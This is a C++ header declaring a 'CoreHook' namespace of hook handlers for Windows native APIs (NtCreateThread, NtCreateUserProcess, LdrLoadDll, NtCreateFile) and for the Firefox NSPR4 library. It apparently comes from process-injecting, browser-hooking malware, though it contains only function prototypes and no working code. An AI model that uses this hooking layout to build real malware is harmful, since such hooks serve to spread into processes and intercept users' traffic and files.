
#pragma once

#include "..\common\ntdll.h"

namespace CoreHook
{
 
  void init(void);

  
  void uninit(void);

  void disableFileHookerForCurrentThread(bool disable);
  

#if defined HOOKER_SETCHILDPROCESSFLAGS
  bool setChildProcessFlags(DWORD processFlags);
#endif

#if(BO_NSPR4 > 0)
  
  void __forceinline markNspr4AsHooked(void);
#endif
 
  NTSTATUS NTAPI hookerNtCreateThread(PHANDLE threadHandle, ACCESS_MASK desiredAccess, POBJECT_ATTRIBUTES objectAttributes, HANDLE processHandle, PCLIENT_ID clientId, PCONTEXT threadContext, PINITIAL_TEB initialTeb, BOOLEAN createSuspended);

  NTSTATUS NTAPI hookerNtCreateUserProcess(PHANDLE processHandle, PHANDLE threadHandle, ACCESS_MASK processDesiredAccess, ACCESS_MASK threadDesiredAccess, POBJECT_ATTRIBUTES processObjectAttributes, POBJECT_ATTRIBUTES threadObjectAttributes, ULONG createProcessFlags, ULONG createThreadFlags, PVOID processParameters, PVOID parameter9, PVOID attributeList);

#if defined(HOOKER_LDRLOADDLL)
  NTSTATUS NTAPI hookerLdrLoadDll(PWCHAR pathToFile, ULONG flags, PUNICODE_STRING moduleFileName, PHANDLE moduleHandle);
#endif  

#if(0)
  NTSTATUS NTAPI hookerNtQueryDirectoryFile(HANDLE fileHandle, HANDLE eventHandle, PIO_APC_ROUTINE apcRoutine, PVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, PVOID fileInformation, ULONG length, FILE_INFORMATION_CLASS fileInformationClass, BOOLEAN returnSingleEntry, PUNICODE_STRING fileName, BOOLEAN restartScan);
#endif

 
#if defined(HOOKER_NTCREATEFILE)
  NTSTATUS NTAPI hookerNtCreateFile(PHANDLE fileHandle, ACCESS_MASK desiredAccess, POBJECT_ATTRIBUTES objectAttributes, PIO_STATUS_BLOCK ioStatusBlock, PLARGE_INTEGER allocationSize, ULONG fileAttributes, ULONG shareAccess, ULONG createDisposition, ULONG createOptions, PVOID eaBuffer, ULONG eaLength);
#endif

  BOOL WINAPI hookerGetFileAttributesExW(LPCWSTR fileName, GET_FILEEX_INFO_LEVELS infoLevelId, LPVOID fileInformation);
};
